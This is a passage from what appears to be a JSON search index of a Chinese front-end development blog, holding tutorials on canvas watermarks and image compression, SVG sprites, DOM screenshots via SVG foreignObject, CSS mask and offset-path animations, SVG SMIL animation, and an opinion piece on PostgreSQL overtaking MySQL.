或 Blob 对象，创建一个空的 img 元素，将其 src 设为 File 或 Blob 对象的 URL。 设置 canvas 元素的宽高为 img 元素的宽高，清除画布，绘制图像。 canvas.width = img.width; canvas.height = img.height; ctx.clearRect(0, 0, canvas.width, canvas.height); ctx.drawImage(img, 0, 0, canvas.width, canvas.height); 设置旋转角度，创建重复图像的模式，绘制水印。 ctx.transform(1, 0.5, -0.5, 1, 0, -canvas.height / 2); ctx.rect(0, 0, canvas.width, canvas.height); ctx.fillStyle = ctx.createPattern(imgCover, 'repeat'); ctx.fill(); 在页面渲染合成后的图像，释放创建的 URL 对象。 result.src = canvas.toDataURL(type); URL.revokeObjectURL(img.src); 马上掘金（由于 canvas 的跨域问题，可能需要点击运行按钮重新运行一下才能看到效果）。 ","link":"https://zkrisj.github.io/post/canvas-shi-xian-wen-zi-shui-yin-he-tu-pian-shui-yin-he-cheng/"},{"title":"Canvas drawImage() 方法实现图片压缩","content":"图片压缩原理 CanvasRenderingContext2D.drawImage() 方法可以从页面 DOM 元素作为图像源来根据坐标和大小重新绘制该图像。 HTMLCanvasElement.toDataURL() 和 HTMLCanvasElement.toBlob() 方法支持导出为 base64 字符串或 Blob 对象。 CanvasRenderingContext2D.drawImage() drawImage(image, dx, dy) drawImage(image, dx, dy, dWidth, dHeight) drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight) image 绘制到上下文的元素。允许任何的画布图像源，包括 canvas、img、svg、video 元素和 ImageBitmap 对象等。 dx, dy, dWidth, dHeight 这几个属性表示在 canvas 画布上指定一片区域用来放置图片，dx、dy 指定图片的左上角在 canvas 上的坐标，dWidth、dHeight 指定图片在 canvas 上绘制的区域宽高。如果没有指定 sx、sy、sWidth、sHeight 这4个参数，则图片会被拉伸或缩放在 canvas 区域内。 sx, sy, swidth, sheight 这几个属性是针对图片元素的，表示图片在 canvas 画布上显示的大小和位置。sx、sy 表示在图片上作为左上角的坐标，然后往右下角方向 swidth、sheight 尺寸范围作为最终在 canvas 上显示的图片内容。 图片压缩，需要使用的是 CanvasRenderingContext2D.drawImage() 5个参数的语法，即指定图片的左上角在 canvas 上的坐标为 0 0，图片在 canvas 上绘制的区域宽高为 canvas 的宽高。例如，图片的原始尺寸是 4000*3000，现在要把尺寸限制为 400*300 大小。 const canvas = document.createElement('canvas'); const context = canvas.getContext('2d'); canvas.width = 400; canvas.height = 300; context.drawImage(img,0,0,canvas.width,canvas.height); 如果需要将转换后的图像渲染到页面 DOM 元素，可以使用 HTMLCanvasElement.toDataURL() 方法来获取转换后的图像 base64 格式信息的字符串传递给 img 元素的 src。或使用 HTMLCanvasElement.toBlob() 方法获取 Blob 格式的对象，然后使用 URL.createObjectURL() 获取对象 URL 传递给 img 元素的 src。也可以将该 base64 字符串或 Blob 对象上传到后端服务器。 HTMLCanvasElement.toDataURL() 该方法将图片转换成 base64 格式信息的字符串表示法。 toDataURL() toDataURL(type) toDataURL(type, encoderOptions) type 可选 图片格式，默认为 image/png。File 或 Blob 对象中的 type 属性可以传到此参数。 encoderOptions 可选 在指定图片格式为 image/jpeg 或 image/webp 时，可以从 0 到 1 的区间内选择图片的质量。默认值 0.92 是一个比较合理的图片质量输出参数，通常情况下，我们无需再设定。如果超出取值范围，或使用其他类型参数会被忽略。 HTMLCanvasElement.toBlob() 比 HTMLCanvasElement.toDataURL() 方法多了一个 callback 参数，其他参数相同。 该方法是异步的，无返回值，需要在 callback 回调方法中处理转换结果。 callback 回调方法参数是转换好的包含 canvas 画布上的图像的 Blob 对象，如果图像未被成功创建，可能会获得 null 值。 toBlob(callback) toBlob(callback, type) toBlob(callback, type, quality) 示例 下面原始图片 1920*1200 的大小为 84867 字节（大约 83KB），压缩成 400*300 后大小仅为 16354 字节（约 16KB）。 ","link":"https://zkrisj.github.io/post/canvas-drawimage-fang-fa-shi-xian-tu-pian-ya-suo/"},{"title":"CSS background-position、clip-path 和 SVG Sprites 小图标生成方法","content":"CSS Sprites CSS Sprites 翻译为 CSS 贴图、图像精灵（sprite，意为精灵），指图像合并，通过 CSS background-position 属性定位图像的一部分来使用，使得使用一个图像文件可以替代多个小文件。但是有很多缺点： 不便于维护和扩展、定位不精确等问题，例如：在后期项目迭代中我们需要删除其中一个小图，那么排在它后面的小图位置都要移动，需要再次修改 CSS 样式，或每次都要打开 PS 删除某图标再导出。 无法修改小图颜色，要 UI 设计师调整后替换。 在移动端的大屏手机图标会模糊。 SVG Sprites 类似于 CSS 中的 Sprite，图标图形整合在一起，实际呈现的时候准确显示特定图标。 SVG Sprites 使用 xlink:href=&quot;#id&quot; 的方式获取，便于维护和扩展，因为小图的 id 不会随便改动; 方便改变图片颜色，通过设置 fill: 颜色值，随意改变小图颜色; IE9 以上支持。 symbol 目前，SVG Sprite 最佳实践是使用 &lt;symbol&gt; 元素。&lt;symbol&gt; 元素用于定义可由 &lt;use&gt; 元素实例化的图形模板对象，SVG Sprite 即是 &lt;symbol&gt; + &lt;use&gt; 元素的联合使用。 对同一文档中多次使用的图形使用 &lt;symbol&gt; 元素可以增加结构和语义。 结构丰富的文档可以以图形方式、语音或盲文形式呈现，从而提高可访问性和无障碍。 一个 symbol 元素本身是不呈现的，只有 symbol 元素的实例（即一个引用了 symbol 的 &lt;use&gt; 元素）才能呈现。 &lt;symbol&gt; 可以拥有单独的 viewBox 和 preserveAspectRatio 坐标系属性。而 &lt;g&gt; 元素和 &lt;defs&gt; 元素则没有这些属性，这要比 &lt;defs&gt; 元素方便，例如创建包含多个具有完全不同边界的图标 fontAwesome 字体。 SVG 中的 use 元素支持外链 SVG 文件，即可以调用其他 SVG 文件的元素，所以我们只要在页面使用 use 元素链接到一个 Sprite(包含各个图标的 &lt;symbol&gt; 元素) SVG 文件，然后图标尺寸由 CSS 控制即可。 对比 font-face font-face 在部分 win 系统下，字体较小的时候，会产生锯齿。 font-face 异步加载会延时渲染。 某些浏览器下 font-face 有跨域问题。 SVG 图标具备 font-face 几乎所有的优点：尺寸、颜色可由 CSS 定制。 SVG 图标支持渐变色。 SVG 图标中每个 path 元素可以独立控制。 CSS clip-path 联合 SVG CSS clip-path 属性除了剪裁圆、多边形之外，还支持 url() 函数语法，即可以把 SVG 元素中的路径作为剪裁路径。 SVG 提供了 clipPathUnits 属性用于指示 &lt;clipPath&gt; 元素内容要使用哪种坐标系，默认 userSpaceOnUse（相对创建剪切路径时定义的根坐标），设为 objectBoundingBox（相对于应用剪切路径的元素的边界框，坐标系的原点是对象边界框的左上角，对象边界框的宽度和高度都具有 1 个单位值的长度）模式的数值，即可以将剪裁的图标适用于任意的 HTML 元素尺寸。 对比 SVG Sprites 支持 传统 SVG Sprites clipPath Sprites 矢量 ✔ ✔ 颜色可变 ✔ ✔ 支持渐变 ✘ ✔ 标签 svg&gt;use 任意 HTML 标签（IE 除外） 兼容性 IE9+ IE9+（需使用 SVG 元素） 尺寸控制 灵活 transform 方法受限，clipPathUnits 方法灵活 工具 丰富 ✔ 起步中…… 参考资料 介绍一种全新的clipPath Sprites小图标技术 SVG Sprites技术介绍 ","link":"https://zkrisj.github.io/post/css-background-positionclip-path-he-svg-sprites-xiao-tu-biao-sheng-cheng-fang-fa/"},{"title":"使用 SVG forginObject 对页面 DOM 元素截图","content":"介绍 可缩放矢量图形（Scalable Vector Graphics，SVG）是由万维网联盟（W3C）自 1999 年开始开发的开放标准。SVG 能够优雅而简洁地渲染不同大小的图形，并可以和 CSS、DOM 和 SMIL 等其他网络标准无缝衔接。它实现了 DOM 接口，这点比 Canvas 与 JavaScript 交互方便。 SVG 可以通过定义必要的线和形状来创建一个图形，也可以修改已有的位图，或者将这两种方式结合起来创建图形。图形和其组成部分可以转换变形、合成、或者通过滤镜完全改变外观。 和传统的点阵图像模式（例如 JPEG 和 PNG）不同的是，SVG 格式提供的是矢量图，这意味着它的图像能够被无限放大而不失真或降低质量，并且可以方便地修改内容，无需图形编辑器。 目前，SVG2.0 正在制定当中，它采用了类似 CSS3 的制定方法，通过若干松散耦合的组件形成一套标准。 命名空间 作为 XML 的一个方言，SVG 需要在一个命名空间内（is namespaced）。 命名空间声明通过 xmlns（XML Namespaces）属性声明。 这意味着这个 &lt;svg&gt; 标签和它的子节点都属于 http://www.w3.org/2000/svg 这个 SVG 命名空间。 浏览器如果能识别这个命名空间，就决定他们如何处理这个标记。 但是，如果 SVG 元素是直接内联在 HTML 页面中，则可以不指定命名空间。 SVG 中的 &lt;foreignObject&gt; 元素 允许包含来自不同的 XML 命名空间的元素，例如在 SVG 中嵌入 HTML。 并可以作为其它标记的容器和 SVG 样式属性的载体。 因为 foreignObject 是一个 SVG 元素，所以可以使用任何 SVG 的语法应用到它的内容。 生成图片 使用 html2canvas 库可以实现在 node 项目中对页面元素截图。而在如果不使用库的情况下，利用 SVG 代码可以内联在 base64 字符串中的特性，通过原生的 SVG forginObject 元素也可以实现对 DOM 元素截图。例如，页面有以下元素： &lt;div id=&quot;box&quot;&gt; &lt;div style=&quot;padding: 1rem; text-align: center;&quot;&gt; &lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c579b7ac874849dd89b7a9792f6b9412~tplv-k3u1fbpfcp-watermark.image?&quot; crossorigin=&quot;Anonymous&quot;&gt; &lt;p class=&quot;name&quot;&gt;名称&lt;/p&gt; &lt;p class=&quot;title&quot;&gt;标题&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; 创建一个空的 canvas 元素和其上下文。 const canvas = document.createElement('canvas'); const context = canvas.getContext('2d'); 定义绘制 canvas 图片的方法。 function draw(img) { const { width, height } = img; canvas.width = width; canvas.height = height; context.clearRect(0, 0, width, height); context.drawImage(img, 0, 0); } 定义 DOM 元素转 SVG 元素方法，如果元素中含有 img 元素，需要将 src 属性中的 url 转成base64 字符串。 function dom2Svg(eleTarget) { if (!eleTarget) return eleTarget; const cloneDom = eleTarget.cloneNode(true); if (cloneDom.tagName == 'IMG') { draw(cloneDom); cloneDom.src = canvas.toDataURL(); } else cloneDom.querySelectorAll('img').forEach(img =&gt; { draw(img); img.src = canvas.toDataURL(); }); const { offsetWidth, offsetHeight } = eleTarget; const htmlSvg = `data:image/svg+xml;charset=utf-8,&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;${offsetWidth}&quot; height=&quot;${offsetHeight}&quot;&gt;&lt;foreignObject x=&quot;0&quot; y=&quot;0&quot; width=&quot;100%&quot; height=&quot;100%&quot;&gt;${new XMLSerializer().serializeToString(cloneDom) + document.querySelector('style').outerHTML}&lt;/foreignObject&gt;&lt;/svg&gt;` .replace(/\\n/g, '').replace(/\\t/g, '').replace(/#/g, '%23'); return htmlSvg; } 绑定 DOM 元素点击事件下载转换的图片。 box.addEventListener('click', function(event) { const { target } = event; if (target !== this) { const eleLink = document.createElement('a'); eleLink.download = Date.now(); eleLink.style.display = 'none'; const img = new Image(); img.onerror = console.error; img.onload = function() { draw(this); eleLink.href = canvas.toDataURL(); eleLink.click(); }; img.src = dom2Svg(target); } }); 注意事项： 元素的样式需要内联设置在 style 属性上（或将 &lt;style&gt; 内联在元素内），才能在 SVG 中生效。 如果元素中含有 img 元素，需要在 img 元素上设置 crossorigin=&quot;Anonymous&quot;，否则可能出现跨域报错。 Uncaught SecurityError: Failed to execute 'toDataURL' on 'HTMLCanvasElement': Tainted canvases may not be exported./preview?projectId=7165157247490719751:19:25 Error: Failed to execute 'toDataURL' on 'HTMLCanvasElement': Tainted canvases may not be exported. 马上掘金 浏览器支持 目前，除了 IE，其他浏览器均支持 SVG forginObject 元素。 参考资料 SVG &lt;foreignObject&gt; 简介与截图等应用 ","link":"https://zkrisj.github.io/post/shi-yong-svg-forginobject-shi-xian-dui-dom-yuan-su-jie-tu/"},{"title":"使用 Canvas 制作满屏爱心和文字动画","content":"介绍 &lt;canvas&gt; 最早由 Apple 引入 WebKit，用于 Mac OS X 的 Dashboard，随后被各个浏览器实现。如今，所有主流的浏览器都支持它。Canvas API 提供了一个通过 JavaScript 和 HTML 的 &lt;canvas&gt; 元素来绘制图形的方式。它可以用于动画、游戏画面、数据可视化、图片编辑以及实时视频处理等方面。Canvas 适合绘制大数据量图形元素的图表（如热力图、地理坐标系或平行坐标系上的大规模线图或散点图等），也适合实现某些视觉特效。它还能能够以 png、jpg 或 webp 格式保存图像。Canvas 提供了强大的 Web 绘图能力，所以我们要学会使用它。 效果如下： 步骤 准备一个 canvas 元素。 &lt;canvas id=&quot;drawHeart&quot;&gt;&lt;/canvas&gt; 获取 canvas 对象和上下文，初始化变量：窗口宽高、爱心和文字总数量、包含爱心和文字的数组，定义爱心图片，图片 src 可以是 base64 字符串类型或者本地图片文件和网络图片链接。 const canvas = document.getElementById('drawHeart'); const ctx = canvas.getContext('2d'); let wW = window.innerWidth; let wH = window.innerHeight; const num = 100; const hearts = []; const heartImage = new Image(); heartImage.src = 'data:image/svg+xml;charset=utf-8,&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;0 0 200 200&quot;&gt;&lt;path id=&quot;heart&quot; d=&quot;M10,30 A20,20,0,0,1,50,30 A20,20,0,0,1,90,30 Q90,60,50,90 Q10,60,10,30 Z&quot; fill=&quot;red&quot;/&gt;&lt;/svg&gt;'; 定义一个 Heart 类，构造函数参数 type 标识用来判断实例为爱心图片还是文字类型，定义重绘方法 draw 和更新方法 update。 class Heart { constructor(type) { this.type = type; // 初始化生成范围 this.x = Math.random() * wW; this.y = Math.random() * wH; this.opacity = Math.random() * .5 + .5; // 偏移量 this.vel = { x: (Math.random() - .5) * 5, y: (Math.random() - .5) * 5 } this.initialW = wW * .5; this.initialH = wH * .5; // 缩放比例 this.targetScale = Math.random() * .15 + .02; // 最小0.02 this.scale = Math.random() * this.targetScale; // 文字位置 this.fx = Math.random() * wW; this.fy = Math.random() * wH; this.fs = Math.random() * 10; this.text = getText(); this.fvel = { x: (Math.random() - .5) * 5, y: (Math.random() - .5) * 5, f: (Math.random() - .5) * 2 } } draw() { ctx.save(); ctx.globalAlpha = this.opacity; ctx.drawImage(heartImage, this.x, this.y, this.width, this.height); // ctx.scale(this.scale + 1, this.scale + 1); if (!this.type) { // 设置文字属性 ctx.fillStyle = getColor(); ctx.font = 'italic ' + this.fs + 'px sans-serif'; // 填充字符串 ctx.fillText(this.text, this.fx, this.fy); } ctx.restore(); } update() { this.x += this.vel.x; this.y += this.vel.y; if (this.x - this.width &gt; wW || this.x + this.width &lt; 0) { // 重新初始化位置 this.scale = 0; this.x = Math.random() * wW; this.y = Math.random() * wH; } if (this.y - this.height &gt; wH || this.y + this.height &lt; 0) { // 重新初始化位置 this.scale = 0; this.x = Math.random() * wW; this.y = Math.random() * wH; } // 放大 this.scale += (this.targetScale - this.scale) * .1; this.height = this.scale * this.initialH; this.width = this.height * 1.4; // -----文字----- this.fx += this.fvel.x; this.fy += this.fvel.y; this.fs += this.fvel.f; if (this.fs &gt; 50) { this.fs = 2; } if (this.fx - this.fs &gt; wW || this.fx + this.fs &lt; 0) { // 重新初始化位置 this.fx = Math.random() * wW; this.fy = Math.random() * wH; } if (this.fy - this.fs &gt; wH || this.fy + this.fs &lt; 0) { // 重新初始化位置 this.fx = Math.random() * wW; this.fy = Math.random() * wH; } } } 定义一个获取随机文字的方法，用来动态渲染屏幕文字。 function getText() { const val = Math.random() * 10; if (val &gt; 1 &amp;&amp; val &lt;= 3) { return 'always'; } else if (val &gt; 3 &amp;&amp; val &lt;= 5) { return 'zzy'; } else if (val &gt; 5 &amp;&amp; val &lt;= 8) { return 'taylor swift'; } else { return 'I Love You'; } } 定义一个获取随机颜色的方法，用来动态渲染屏幕文字颜色。 function getColor() { const val = Math.random() * 10; if (val &gt; 0 &amp;&amp; val &lt;= 1) { return '#00f'; } else if (val &gt; 1 &amp;&amp; val &lt;= 2) { return '#f00'; } else if (val &gt; 2 &amp;&amp; val &lt;= 3) { return '#0f0'; } else if (val &gt; 3 &amp;&amp; val &lt;= 4) { return '#368'; } else if (val &gt; 4 &amp;&amp; val &lt;= 5) { return '#666'; } else if (val &gt; 5 &amp;&amp; val &lt;= 6) { return '#333'; } else if (val &gt; 6 &amp;&amp; val &lt;= 7) { return '#f50'; } else if (val &gt; 7 &amp;&amp; val &lt;= 8) { return '#e96d5b'; } else if (val &gt; 8 &amp;&amp; val &lt;= 9) { return '#5be9e9'; } else { return '#d41d50'; } } 定义渲染和初始化方法，添加 resize 事件，在窗口调整大小时自动适应。 function init() { canvas.width = wW; canvas.height = wH; for (let i = 0; i &lt; num; i++) { hearts.push(new Heart(i % 5)); } render(); } function render() { ctx.clearRect(0, 0, wW, wH); for (let i = 0; i &lt; hearts.length; i++) { hearts[i].draw(); hearts[i].update(); } setTimeout(render, 60); } init(); window.addEventListener('resize', function() { canvas.width = wW = window.innerWidth; canvas.height = wH = window.innerHeight; }); 马上掘金 ","link":"https://zkrisj.github.io/post/shi-yong-canvas-zhi-zuo-man-ping-ai-xin-he-wen-zi-dong-hua/"},{"title":"使用 CSS mask 对图像应用遮罩效果","content":"为什么B站的弹幕可以不挡人物 为什么B站的弹幕可以不挡人物 里面介绍了这个神奇的 mask 属性，我们知道了B站的弹幕可以不挡人物的原理： 视频处理：对有人物出现的每一帧视频画面都由后台 AI 识别后生成对应的 base64 图片，这个图片具有人物的透明轮廓。一张图片也就一两K，不会造成性能负担。 视频画面上设置一个绝对定位元素。 视频播放时由 JS 动态设置绝对定位元素的 mask-image 的 url 地址为当前帧对应的 base64 图片。 mask 属性 CSS mask 属性通过遮罩或者裁切特定区域的图片的方式来隐藏一个元素的部分或者全部可见区域。可以使用图像、SVG 或渐变色作为遮罩来做一些特效。它是以下 CSS 属性的简写： mask-image: 使用的图片资源，默认 none。 mask-mode: 根据资源的类型自动采用合适的遮罩模式，默认 match-source（目前只有 Firefox 支持）。 mask-repeat: 类似于 background-repeat 属性，默认 repeat。 mask-position: 和 background-position 支持的属性值和表现一样，默认 center。 mask-clip: 和 background-clip 类似，但是多了 SVG 元素支持，默认 border-box。 mask-origin: 和 background-origin 类似，但是多了 SVG 元素支持，默认 border-box。 mask-size: 和 background-size 类似，默认 auto。 mask-composite: 使用多个图片进行遮罩时候的混合方式，默认 add，表示多个图片遮罩效果累加。其他值： subtract 遮罩相减。也就是遮罩图片重合的地方不显示。意味着遮罩图片越多，遮罩区域越小。 intersect 遮罩相交。也就是遮罩图片重合的地方才显示遮罩，。 exclude 遮罩排除。也就是后面遮罩图片重合的地方排除，当作透明处理。 另外，还有两个相关的 CSS 属性： mask-type：和 mask-mode 类似，但是只能作用在 SVG &lt;mask&gt; 元素上。 -webkit-mask-box-image：为元素的边框设置遮罩图像（目前只有 Firefox 不支持）。 可以使用 CSS 功能查询来检测支持： @supports(-webkit-mask: url(#mask)) or (mask: url(#mask)) { /* code that requires mask here. */ } 使用 原图： 渐变色遮罩 下面创建了一个椭圆渐变色遮罩，所以只有椭圆形状之内的图像可见，并且渐变色可以产生模糊效果。 图片和 SVG 遮罩 这可以实现与 clip-path 类似的效果，但并不完全相同。遮罩只是将不可见部分用颜色转换隐藏，而 clip-path 则是将元素切割为可见部分，不可见部分已经不属于元素。通过鼠标 cursor: pointer 可以看到 clip-path 不可见部分没有鼠标样式了。 联合使用遮罩 SVG 中 &lt;mask&gt; 元素作为遮罩元素 在 SVG 中，可以使用 mask 元素定义一个透明的遮罩层和当前对象合成，形成背景。然后使用 mask 属性来引用已定义的 &lt;mask&gt; 遮罩元素，将绑定的元素应用到给定的遮罩效果。从 SVG2 开始，mask 可以直接用作 CSS 样式属性，语法与 CSS mask 属性相同。 既能够把内联 SVG 中的 &lt;mask&gt; 作为遮罩，也可以把外链的 SVG 文件中的 &lt;mask&gt; 作为遮罩。 既能够作用在普通 HTML 元素上，也能够作用在 SVG 元素上。 浏览器兼容 目前，除了 Firefox 浏览器，都需要添加 -webkit- 前缀才能使用。 ","link":"https://zkrisj.github.io/post/shi-yong-css-mask-dui-tu-xiang-ying-yong-zhe-zhao-xiao-guo/"},{"title":"新 CSS 属性 offset-path 使元素沿着不规则路径运动","content":" theme: nico 本文正在参加「金石计划 . 瓜分6万现金大奖」 介绍 SVG SMIL animation 可以很容易实现元素沿着不规则的路径运动动画，但由于其依赖 SVG 元素和 HTML 属性，容易造成复用时的冗余，不利于维护。新 CSS 属性 offset-path 可以看成是其替代方案，它指定了元素的运动路径，并定义元素在父容器或 SVG 坐标系中的定位。 与其相关的几个属性： offset-distance 指定元素沿 offset-path 路径运动的距离，可以是数值或者百分比单位，100% 则表示把所有的路径都跑完了。 offset-position 定义元素的 offset-path 初始位置，类似于属性 background-position。 offset-anchor 指定 offset-path 路径框内的原点，其属性值和 transform-origin 类似。 offset-rotate 定义元素沿 offset-path 路径的角度，默认是 auto，表示自动计算当前路径的切线方向，并朝着这个方向前进。 offset-anchor、offset-distance、offset-path、offset-position、offset-rotate 可以简写为一个属性 offset。 [ &lt;'offset-position'&gt;? [ &lt;'offset-path'&gt; [ &lt;'offset-distance'&gt; || &lt;'offset-rotate'&gt; ]? ]? ]! [ / &lt;'offset-anchor'&gt; ]? 使用 只需要设置元素的 offset-path 和原路径重合即可。 作为对比，下面是使用 SVG SMIL animateMotion 元素实现的动画。 示例 下面这个示例则是一个剪刀沿着一个房子图形运动的轨迹动画。 &lt;body&gt; &lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;700&quot; height=&quot;450&quot; viewBox=&quot;350 0 1400 900&quot;&gt; &lt;rect x=&quot;595&quot; y=&quot;423&quot; width=&quot;610&quot; height=&quot;377&quot; fill=&quot;blue&quot; /&gt; &lt;polygon points=&quot;506,423 900,190 1294,423&quot; fill=&quot;yellow&quot; /&gt; &lt;polygon points=&quot;993,245 993,190 1086,190 1086,300&quot; fill=&quot;red&quot; /&gt; &lt;path id=&quot;house&quot; d=&quot;M900,190 L993,245 V201 A11,11 0 0,1 1004,190 H1075 A11,11 0 0,1 1086,201 V300 L1294,423 H1216 A11,11 0 0,0 1205,434 V789 A11,11 0 0,1 1194,800 H606 A11,11 0 0,1 595,789 V434 A11,11 0 0,0 584,423 H506 L900,190&quot; fill=&quot;none&quot; stroke=&quot;black&quot; stroke-width=&quot;13&quot; stroke-linejoin=&quot;round&quot; stroke-linecap=&quot;round&quot; /&gt; &lt;path class=&quot;scissorHalf&quot; d=&quot;M30,0 H-10 A10,10 0 0,0 -20,10 A20,20 0 1,1 -40,-10 H20 A10,10 0 0,1 30,0 M-40,20 A10,10 1 0,0 -40,0 A10,10 1 0,0 -40,20 M0,0&quot; transform=&quot;translate(0,0)&quot; fill=&quot;green&quot; stroke=&quot;black&quot; stroke-width=&quot;5&quot; stroke-linejoin=&quot;round&quot; stroke-linecap=&quot;round&quot; fill-rule=&quot;evenodd&quot; /&gt; &lt;path class=&quot;scissorHalf&quot; d=&quot;M30,0 H-10 A10,10 0 0,1 -20,-10 A20,20 0 1,0 -40,10 H20 A10,10 0 0,0 30,0 M-40,-20 A10,10 1 0,0 -40,0 A10,10 1 0,0 -40,-20 M0,0&quot; transform=&quot;translate(0,0)&quot; fill=&quot;forestgreen&quot; stroke=&quot;black&quot; stroke-width=&quot;5&quot; stroke-linejoin=&quot;round&quot; stroke-linecap=&quot;round&quot; fill-rule=&quot;evenodd&quot; /&gt; &lt;/svg&gt; &lt;/body&gt; &lt;style&gt; .scissorHalf { offset-path: path( &quot;M900,190 L993,245 V201 A11,11 0 0,1 1004,190 H1075 A11,11 0 0,1 1086,201 V300 L1294,423 H1216 A11,11 0 0,0 1205,434 V789 A11,11 0 0,1 1194,800 H606 A11,11 0 0,1 595,789 V434 A11,11 0 0,0 584,423 H506 L900,190&quot; ); animation: followpath 10s linear infinite; } @keyframes followpath { to { offset-distance: 100%; } } &lt;/style&gt; 浏览器兼容 目前只有 Safari 浏览器不支持 offset-path 的路径函数。 参考资料 使用 CSS offset-path 让元素沿着不规则路径运动 ","link":"https://zkrisj.github.io/post/xin-css-shu-xing-offset-path-shi-yuan-su-yan-zhao-bu-gui-ze-lu-jing-yun-dong/"},{"title":"SVG animation 动画的使用","content":"介绍 SVG 内容可以通过以下方式进行动画处理： 使用 SVG 动画。SVG 动画文档片段可以描述对文档元素的基于时间的修改，可以定义运动路径，或插入元素的属性和样式属性。这些效果可以链接在一起或触发以响应文档中的其他事件。 使用 CSS 动画。这个 CSS 模块定义了使用关键帧随时间动画化 CSS 属性值的方法。这些关键帧动画的行为可以通过指定它们的持续时间、重复次数和重复行为来控制。 使用 CSS 过渡。此 CSS 模块定义属性以指定 CSS 属性值的更改在指定的持续时间内逐渐发生。 使用 SVG DOM。SVG DOM 被定义为 DOM4 规范的扩展。每个属性和样式表设置都可以通过脚本访问，并且 SVG 提供了一组额外的 DOM 接口来通过脚本支持高效的动画。理想情况下，支持脚本的浏览器也将实现 HTML 中定义的动画帧 API 。 使用 Web Animations API。这个 DOM API 提供了一个脚本接口来触发样式属性和属性的用户代理优化动画，而不需要计算单个帧的值。 SVG 动画通过 SMIL（Synchronized Multimedia Integration Language，同步多媒体合成语言）实现，通过在一个 SVG 元素内添加一个动画元素比如 &lt;animate&gt; 即可以实现动画。 动画元素的数字属性（x，y 等） 动画元素的颜色属性 动画元素的 transform 属性（平移或旋转等） 使元素沿着指定路径运动 CSS 动画 下面通过 CSS 属性实现 SVG 的动画。 也可以通过 SMIL 方式实现，但是没有 CSS 控制动画灵活。 SVG animation 元素 set 用来设定一个属性值，并为该值赋予一个持续时间。它支持所有的属性类型，包括那些原理上不能插值的，例如值为字符串和布尔类型的属性。set 元素是非叠加的。无法在其上使用 additive 属性或 accumulate 属性，即使声明了这些属性也会自动被忽略。 animate 放在形状元素的内部，用来定义一个元素的某个属性如何踩着时点改变。在指定持续时间里，属性从开始值变成结束值。 animateTransform 在其目标元素上设置 transform 属性的动画，从而允许动画控制平移、缩放、旋转或倾斜等。 animateMotion 定义元素如何沿着路径移动。 事件 下面示例绑定了几个动画事件：点击按钮开始，点击按钮停止，鼠标悬停暂停，鼠标移开取消暂停。 &lt;button id=&quot;b1&quot;&gt;点击开始动画&lt;/button&gt; &lt;button id=&quot;b2&quot;&gt;点击停止动画&lt;/button&gt; &lt;h5&gt;&lt;mark&gt;鼠标悬停暂停&lt;/mark&gt;&lt;/h5&gt; &lt;svg width=&quot;300&quot; height=&quot;100&quot; id=&quot;svg&quot;&gt; &lt;title&gt;SVG SMIL Animate with Path&lt;/title&gt; &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;300&quot; height=&quot;100&quot; stroke=&quot;black&quot; stroke-width=&quot;1&quot; /&gt; &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;20&quot; height=&quot;20&quot; fill=&quot;blue&quot; stroke=&quot;black&quot; stroke-width=&quot;1&quot;&gt; &lt;animateMotion id=&quot;ani&quot; path=&quot;M 250,80 H 50 Q 30,80 30,50 Q 30,20 50,20 H 250 Q 280,20,280,50 Q 280,80,250,80Z&quot; dur=&quot;3s&quot; repeatCount=&quot;indefinite&quot; rotate=&quot;auto&quot; begin=&quot;indefinite&quot; /&gt; &lt;/rect&gt; &lt;/svg&gt; &lt;script&gt; svg.onmouseout = e =&gt; svg.unpauseAnimations(); svg.onmouseover = e =&gt; svg.pauseAnimations(); b1.onclick = e =&gt; ani.beginElement(); b2.onclick = e =&gt; ani.endElement(); &lt;/script&gt; 补充：目前 SVG SMIL animation 动画相关资料还是太少，尤其对各个属性和方法的解释、示例，而且标准也在不断变动，所以 CSS 动画在功能和兼容方面还是更有优势。 参考资料 SVG animation with SMIL 超级强大的 SVG SMIL animation 动画详解 ","link":"https://zkrisj.github.io/post/svg-animation-dong-hua-de-shi-yong/"},{"title":"进击的 PostgreSQL，下坠的 MySQL","content":"2022 开发者调查报告 StackOverflow 发布的 2022 开发者调查报告中，在专业开发者群体受欢迎排行榜中，PostgreSQL（46.48%）首次超越 MySQL（45.68%）拔得头筹。专业开发者与初学者的不同之处在于，他们更倾向于选择 Redis、PostgreSQL、Microsoft SQL Server 和 Elasticsearch。 初学者群体当中，MySQL 也并不乐观，紧随其后的 MongoDB 位居第二，占比近1/3。“这很合理，因为它支持大量的语言和应用开发平台。” 值得一提的是，正在使用 MySQL 的开发者同样也在考虑、希望或想要使用别的数据库工作，下图展示了调查结果。 有 11185 名 MySQL 开发者想使用 PostgreSQL 工作，以及 9520 名 MySQL 开发者想使用 MongoDB 工作。 不止 StackOverflow 的报告，根据最新的 10 月 DB-Engines 流行趋势上看，也可以看见 MySQL 的受欢迎程度已经连续几年呈现下滑趋势。 下坠的 MySQL 可以判断，如果不出意外，同样在开源关系型数据库之列的 PostgreSQL ，超越 MySQL 只是时间的问题。 如今，行业的发展开始向金融、电信、物联网、零售、制造等传统行业倾斜，这些行业与二十年前的互联网相比，更加注重数据可靠性、安全性、规范性。 疫情以来，企业基础设施的现代化要求加速提上议程，旨在让企业更加灵活，并对快速变化的客户需求做出反应。而承担这些项目的全球系统集成商们，往往选择应用最容易部署的技术，从而为其服务带来最佳利润，然而，商业版 MySQL 是需要付费的，且 MySQL 对于多语言的支持明显存在自身的瓶颈。 MySQL 的客户端遵循 GPL 许可协议，所以开发人员必须向 Oracle 付费或者将自己的应用程序开源。而 PostgreSQL 采用类似 MIT 的许可协议，允许开发人员做任何事情，包括在开源或闭源产品中商用。从这个层面讲，不管出于商用还是其他，PostgreSQL 都是最有利的选择。 进击的 PostgreSQL 前面我们从开源热情、行业发展、商用的角度分析了 MySQL 停滞的原因。这里我们以开发者的视角，具体列举一些 PostgreSQL 的好处： 支持多种可用于商业解决方案的性能优化，包括地理空间数据支持、无读锁并发等，被广泛应用于大型系统； 对于需要执行复杂查询的系统最为有利； 